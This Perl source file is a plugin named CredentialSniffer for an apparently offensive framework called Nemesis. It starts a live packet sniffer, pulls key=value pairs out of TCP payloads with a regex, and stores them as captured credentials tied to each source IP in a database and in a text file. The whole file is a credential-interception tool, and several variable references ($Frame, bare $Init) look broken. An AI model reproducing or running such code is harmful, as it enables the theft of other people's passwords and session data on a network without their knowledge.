package Plugin::CredentialSniffer;
use MooseX::Declare;

use Nemesis::Inject;

class Plugin::CredentialSniffer {

    our $VERSION = '0.1a';
    our $AUTHOR  = "luca9010";
    our $MODULE  = "CredentialSniffer plugin";
    our $INFO    = "<www.dark-lab.net>";

    our @PUBLIC_FUNCTIONS = qw(start stop);

    nemesis_module;

    method start() {

      if($self->Init->checkroot()){
        $self->Init->getIO()->print_alert("You need root permission to do this; otherwise you wouldn't see anything");
      }
      my $LiveSniffer=$Init->ml->getInstance("LiveSniffer");
         $LiveSniffer->start()
    }

    method clear(){
      $self->stop();
    }

    method stop(){
        #$self->Sniffer()->destroy() if($self->Sniffer);
    }

    method event_tcp($Packet){
      # connection with the DB
        my $ModuleLoader=$self->Init->getModuleLoader;
        $self->DB($ModuleLoader->loadmodule("DB")->connect());
        
        $Init->io->info($Frame->print);
        
        my $Ip = $Frame->ref->{'IPv4'};
        my $Tcp=$Frame->ref->{'TCP'}->unpack;

        my $payload= $Tcp->payload if $Tcp;
        open my $fh_out, '>>', 'file_di_output.txt';
        #print $fh_out 'PAYLOAD: '.$payload."\n-----------------------------------------------------\n" if $Tcp->payload;
        if($Tcp->payload){
                while($payload =~ /(\w{3,10})=\s*(\w+)&?/g){
                    #print $fh_out $1.": ".$2."\n---------------------------------\n" if($1 ne "" && $2 ne "");
                    my $parameter = $1;
                    my $value = $2;
                    
                    my $results=$self->DB->search(ip => $Ip->src); # search for the node in the DB
                    my $DBHost; 
                    while( my $chunk = $results->next ){ 
                        for my $foundhost (@$chunk){
                            $DBHost=$foundhost; # if exist, in DBHost i've the node found through research
                            last;
                        }
                    }

                    #create a new node of the DB
                    my $Node=Resources::Node->new(
                                ip => $Ip->src
                                );
                    # create a new credential
                    $Credenzial = new Resources::Credential(
                                SITE => "soon...",
                                PARAMETER => $parameter,
                                VALUE => $value
                                );
                    # insert in attachments field of the node the new credential found
                    $Node->attachments->insert($Credenzial); 


                    if(!defined($DBHost)){
                        $self->DB->add($Node);
                    }else {
                        $self->DB->swap($DBHost,$Node);#This automatically generate a Resources::Snap db object to track the change
                    }

                    print $fh_out $parameter.": ".$value."\n---------------------------------\n";
                }
        }
        #$Init->io->debug('PAYLOAD: '.$payload) if $Tcp->payload;

    }